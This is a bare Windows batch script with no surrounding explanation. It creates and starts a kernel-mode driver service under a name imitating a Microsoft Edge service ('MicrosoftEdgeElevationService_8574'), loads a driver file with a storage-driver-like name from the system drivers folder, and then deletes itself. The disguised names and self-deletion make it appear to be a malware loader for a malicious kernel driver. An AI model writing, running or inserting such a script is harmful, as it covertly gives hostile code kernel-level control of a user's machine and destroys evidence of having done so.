@echo off
cd %~dp0
sc create MicrosoftEdgeElevationService_8574 binpath=C:\Windows\System32\drivers\MegaSas0i.sys type=kernel
sc start MicrosoftEdgeElevationService_8574
del "%~f0"